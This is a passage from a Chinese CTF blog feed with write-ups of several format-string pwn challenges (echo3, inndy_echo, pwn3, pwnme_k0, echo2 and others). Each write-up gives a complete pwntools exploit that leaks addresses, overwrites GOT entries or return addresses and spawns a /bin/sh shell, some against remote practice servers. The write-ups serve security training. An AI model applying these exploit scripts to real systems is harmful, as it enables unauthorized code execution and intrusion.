alt></p><p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continuedef fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li></ul><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p><p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p><p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞小总结（下）&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞小总结（下）&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞小总结（下）&quot;&gt;&lt;/a&gt;格式化字符串漏洞小总结（下）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞题目练习</title>
    <link href="http://chumen77.xyz/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/03/15/格式化字符串漏洞题目练习/</id>
    <published>2020-03-15T06:38:15.000Z</published>
    <updated>2020-06-26T03:43:20.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools模块，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><pre><code class="c">[DEBUG] Sent 0x3c bytes:    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  │····│····│····│····│    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  │%240│c%7$│hhn%│132c│    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  │%8$h│hn%1│28c%│9$hh│    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               │n%4c│%10$│hhn·││    0000003c</code></pre><p>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+2Ch] [ebp-5Ch]  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(&amp;buf, 0, 0x50u);  read(0, &amp;buf, 0x50u);  printf(&amp;buf);  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);  if ( *(_DWORD *)&amp;x != 4 )    return 0;  puts(&quot;running sh...&quot;);  system(&quot;/bin/sh&quot;);  return 0;}</code></pre><p>十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./fm&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26915)# io.recv()payload = p32(0x0804A02C) + &#39;%11$hn&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre><code class="c">#include &lt;stdio.h&gt;int main() {    setvbuf(stdout, 0, _IONBF, 0);    alarm(180);    char str[100];    while(gets(str)) {        printf(str);    }    return 0;}</code></pre><p>需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./fmt1&#39;)elf = ELF(&#39;./fmt1&#39;)libc = elf.libcprintf_got = 0x0000601020io.sendline(&#39;%21$p&#39;)io.recvuntil(&#39;0x&#39;)libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]print(&#39;leak_libc_base: &#39; + hex(libc_base))print(&#39;system_addr: &#39; + hex(system_addr))def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_addrfor i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)io.sendline(payload)sleep(1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int magic = 0 ;int main(){    char buf[0x100];    setvbuf(stdout,0,2,0);    puts(&quot;Please crax me !&quot;);    printf(&quot;Give me magic :&quot;);    read(0,buf,0x100);    printf(buf);    if(magic == 0xda){        system(&quot;cat /home/craxme/flag&quot;);    }else if(magic == 0xfaceb00c){        system(&quot;cat /home/craxme/craxflag&quot;);    }else{        puts(&quot;You need be a phd&quot;);    }}</code></pre><p>编译为64位。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。<br>思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入<code>/bin/sh</code>即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./craxme&#39;)# io = remote(&#39;127.0.0.1&#39;,8888)magic = 0x0000060106Cio.recvuntil(&#39;:&#39;)system_plt = 0x04005A0puts_got = 0x0601018ret_addr = 0x00400747printf_got = 0x00601030key = 0x00400747key2 = 0x04005A0def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key &gt;&gt; i*16) &amp; 0xfffffor i in range(3):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])io.sendline(payload)io.interactive()</code></pre><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题模拟了一个ftp服务。<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>这里控制的是登陆。进入分析一下：</p><pre><code class="c">char *__cdecl ask_username(char *dest){  char src[40]; // [esp+14h] [ebp-34h]  int i; // [esp+3Ch] [ebp-Ch]  puts(&quot;Connected to ftp.hacker.server&quot;);  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);  __isoc99_scanf(&quot;%40s&quot;, src);  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )    ++src[i];  return strcpy(dest, src);}</code></pre><p>用户名函数，发现对你输入的东西进行诸位的进行加一。</p><pre><code class="c">int __cdecl ask_password(char *s1){  if ( !strcmp(s1, &quot;sysbdmin&quot;) )    return puts(&quot;welcome!&quot;);  puts(&quot;who you are?&quot;);  exit(1);  return puts(&quot;welcome!&quot;);}</code></pre><p>用户密码函数，发现要跟<code>sysbdmin</code> 进行对比，如果不相等，就直接退出。<br>(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）<br>所以这个绕过就时sysbdmin 诸位减1即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>剩下的就是输入<code>get put dir</code>,会进入不同的分支，其中输入get函数：</p><pre><code class="c">int get_file(){  char dest; // [esp+1Ch] [ebp-FCh]  char s1; // [esp+E4h] [ebp-34h]  char *i; // [esp+10Ch] [ebp-Ch]  printf(&quot;enter the file name you want to get:&quot;);  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    puts(&quot;too young, too simple&quot;);  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  {    if ( !strcmp(i, &amp;s1) )    {      strcpy(&amp;dest, i + 40);      return printf(&amp;dest);    }  }  return printf(&amp;dest);}</code></pre><p>这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了：</p><ul><li>由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。</li><li>修改puts函数的got为system的地址，然后记得这个文件的名称是<code>/bin/sh</code>,这样在使用dir调用puts函数时，就可以拿到shell了。<br>这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./pwn3&#39;)elf = ELF(&#39;./pwn3&#39;)libc = elf.libcs = &#39;sysbdmin&#39;key = &#39;&#39;for i in s:    key+=chr(ord(i)-1)print(key)io.sendline(key)info(&#39;---------leak libc_base--------&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;1111&#39;)puts_got = elf.got[&#39;puts&#39;]io.sendline(&#39;%8$s&#39; + p32(puts_got) )io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)io.sendline(&#39;1111&#39;)puts_addr = u32(io.recv(4)[:4])print(&#39;puts_add:&#39; + hex(puts_addr))sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]io.recvuntil(&#39;&gt;&#39;)info(&#39;---------hijack puts_got--------&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;/bin/sh;&#39;)payload = fmtstr_payload(7,{puts_got: sys_addr})io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)info(&#39;--------- get shell-------&#39;)io.sendline(&#39;/bin/sh;&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;dir&#39;)io.interactive()</code></pre><h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><h3 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启了RELRO，这样就无法修改got了。</p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>其中发现其输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。<br>Gdb调试定位关键在这个printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。</p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn echo(){  char s; // [rsp+0h] [rbp-110h]  unsigned __int64 v1; // [rsp+108h] [rbp-8h]  v1 = __readfsqword(0x28u);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s, 256LL);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。</p><h3 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre><p>找到关键点，然后看一下栈情况：</p><pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087--More--(25/48)0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad20870216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre><p>发现在<code>0x7fffffffe1e0</code>这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的<br>plt和got地址。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./echo2&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,28200)def leak1():    io.sendline(&#39;%34$p&#39;)    io.recvuntil(&#39;0x&#39;)    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)    return p_bass_addrp_bass_addr = leak1()print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint(&#39;print_got -&gt;&#39; + hex(print_got))system_plt = 0x790 + p_bass_addrprint(&#39;system_plt -&gt;&#39; + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])# raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>-—  </p><p>** 接下来的题，都是buf不再栈的上的题目。**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>可以看到nx保护是关闭的，可以想办法利用shellcode。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  while ( 1 )  {    result = (int)fgets(buf, 1024, stdin);    if ( !result )      break;    echo();  }  return result;}</code></pre><p>漏洞函数：</p><pre><code class="c">int make_response(){  return snprintf(response, 0x400u, buf);}</code></pre><p>代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。</p><h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code class="html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 